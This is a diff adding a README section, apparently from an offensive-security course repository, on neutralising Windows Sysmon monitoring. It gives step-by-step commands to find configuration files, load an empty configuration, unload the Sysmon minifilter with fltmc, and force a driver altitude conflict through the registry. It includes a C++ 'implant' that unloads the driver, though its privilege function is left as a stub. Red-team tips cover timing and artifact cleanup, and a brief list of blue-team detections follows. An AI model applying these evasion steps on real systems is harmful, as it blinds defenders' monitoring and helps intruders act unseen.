@@ -1821,7 +1821,237 @@ The tool provides comprehensive output showing:
 - **Testing:** Always validate detection methods in controlled environments
 
 This toolkit implements a comprehensive, step-by-step approach to detecting Sysmon installations, following the exact methodology demonstrated in the technical walkthrough. It uncovers Sysmon regardless of where it tries to hide in the system architecture.
+</details>
 
 
 
+
+<details>
+<summary>07 - Dancing with Sysmon-Killem</summary>
+
+A comprehensive guide to disabling or evading Sysmon monitoring through various techniques, depending on your privilege level on the target system.
+
+## Overview
+
+This toolkit provides methods to neutralize Sysmon monitoring capabilities through multiple approaches, from configuration manipulation to driver unloading and altitude conflicts. The techniques vary based on whether you have regular user privileges or local administrator access.
+
+## Step-by-Step Neutralization Methods
+
+### Step 1: Assess Your Privilege Level
+
+**Regular User:**
+- Limited options available
+- Focus on reconnaissance and finding misconfigurations
+- Search for Sysmon configuration files left accessible on disk
+
+**Local Administrator:**
+- Full range of neutralization techniques available
+- Can manipulate services, drivers, and configurations
+- Sysmon is not hardened against "rogue admin" attacks
+
+### Step 2: Regular User Reconnaissance
+
+#### Hunt for Configuration Files
+Search for Sysmon XML configuration files that may have been left accessible:
+```cmd
+dir C:\*.xml /s
+dir C:\Windows\*.xml /s
+dir C:\ProgramData\*.xml /s
+```
+
+#### Parse Configuration Files
+Once found, analyze the XML rulesets to identify blind spots and exceptions. Refer to the white paper by Matt Graeber and Lee Christensen for detailed analysis techniques.
+
+### Step 3: Administrative Techniques - Configuration Manipulation
+
+#### Extract Current Configuration
+```cmd
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\onedrv\Parameters"
+```
+
+This reveals:
+- Service configuration
+- Driver name
+- Path to configuration file
+- Current rulesets
+
+#### Load Permissive Configuration
+Replace the current configuration with a permissive one that excludes all monitoring:
+```cmd
+Sysmon.exe -c empty_config.xml
+```
+
+**Note:** This action itself will be logged if the current configuration monitors configuration changes.
+
+#### Analyze Rules Registry Value
+Examine the `Rules` value in the registry, which contains the current filtering rules that can be manipulated.
+
+### Step 4: Driver Unloading (Immediate Effect)
+
+#### Manual Method using FLTMC
+```cmd
+# List all minifilter drivers
+fltmc instances
+
+# Unload Sysmon driver
+fltmc unload ofltdrv
+```
+
+#### Programmatic Method
+The provided C++ code uses the Filter Management API to unload the Sysmon driver:
+
+**Key Requirements:**
+- Administrative privileges
+- SE_LOAD_DRIVER_NAME privilege enabled
+
+**Code Implementation:**
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <fltuser.h>
+
+#pragma comment(lib, "FltLib.lib")
+#pragma comment(lib, "Advapi32.lib")
+
+BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
+    // Privilege escalation code to enable SE_LOAD_DRIVER_NAME
+    // This is required for unloading filters
+}
+
+int main() {
+    // Enable load driver privilege
+    if (!SetPrivilege(SE_LOAD_DRIVER_NAME, ENABLE))
+        return -1;
+    
+    // Unload the Sysmon driver
+    HRESULT hres = FilterUnload(L"ofltdrv");
+    if (hres == S_OK)
+        printf("Sysmon driver unloaded successfully\n");
+    else
+        printf("Unload failed: 0x%x\n", hres);
+    
+    return 0;
+}
+```
+
+**Important Notes:**
+- This only unloads the kernel minifilter driver
+- The Sysmon service continues running
+- DNS events via ETW providers still get logged
+- Requires the SE_LOAD_DRIVER_NAME privilege
+
+### Step 5: Verify Unload Effectiveness
+
+#### Check Minifilter Status
+```cmd
+fltmc instances | findstr "ofltdrv"
+```
+
+#### Monitor Sysmon Logs
+Check Event Viewer for error messages:
+```
+Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
+```
+
+Look for error events indicating driver communication failures.
+
+### Step 6: Understand ETW Provider Persistence
+
+Even after driver unloading, some events continue via ETW providers:
+
+#### Identify Registered Providers
+```cmd
+logman query providers | findstr "1DRV"
+```
+
+#### Check DNS Client Provider
+```cmd
+logman query providers "Microsoft-Windows-DNS-Client"
+```
+
+The Sysmon service remains registered to the DNS client ETW provider, so DNS queries continue to be logged even after the minifilter is unloaded.
+
+### Step 7: Altitude Conflict Attack (Requires Reboot)
+
+#### Understanding Minifilter Altitudes
+- Altitudes determine driver position in the I/O processing stack
+- Each minifilter has a unique altitude number
+- Conflicts occur when two drivers share the same altitude
+- Microsoft manages altitude allocations to prevent conflicts
+
+#### Manual Altitude Modification
+```cmd
+# Check current altitude
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude
+
+# Change to conflict with Bitdefender driver (requires admin)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d 320832 /f
+
+# Revert to original altitude
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d 385201 /f
+```
+
+#### Effects of Altitude Conflict
+- Sysmon driver fails to load during system startup
+- Kernel monitoring is completely disabled
+- Leaves error logs in Event Viewer
+- DNS events via ETW still work
+- Requires system reboot to take effect
+
+### Step 8: Compile and Execute
+
+#### Building the Unload Tool
+```cmd
+cl implant.cpp
+```
+
+#### Execution
+```cmd
+implant.exe
+```
+
+## Technical Details
+
+### Privilege Requirements
+
+The SE_LOAD_DRIVER_NAME privilege is essential for unloading minifilter drivers. This privilege is not enabled by default in most processes, hence the need for the `SetPrivilege` function.
+
+### Limitations and Considerations
+
+1. **Partial Neutralization:** Driver unloading only affects kernel monitoring; ETW-based logging continues
+2. **Log Evidence:** All techniques leave traces in Sysmon or system logs
+3. **Reboot Requirements:** Altitude conflicts require system restart
+4. **Service Persistence:** The Sysmon service continues running even after driver unloading
+5. **ETW Persistence:** DNS and other ETW-based events continue to be captured
+
+### Detection and Logging
+
+Each technique produces different artifacts:
+
+- **Configuration Changes:** Logged as configuration modification events
+- **Driver Unloading:** Creates error events in Sysmon logs
+- **Altitude Conflicts:** Generate driver load failure events
+- **Service Manipulation:** May be detected by other security tools
+
+## Defense Evasion Strategy
+
+### For Red Teams
+- Use multiple techniques in combination
+- Time operations to minimize detection
+- Clean up artifacts where possible
+- Monitor for blue team responses
+
+### For Blue Teams
+- Monitor for altitude changes in registry
+- Alert on driver unloading operations
+- Watch for configuration file modifications
+- Implement additional logging for service manipulation
+
+## Reference
+
+- [Microsoft Allocated Altitudes](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/allocated-altitudes)
+- Matt Graeber and Lee Christensen's white paper on Sysmon configuration analysis
+- SwiftOnSecurity Sysmon configuration for reference rulesets
+
+This toolkit provides multiple pathways to neutralize Sysmon monitoring, with the choice of technique depending on your operational requirements, time constraints, and acceptable risk of detection.
 </details>
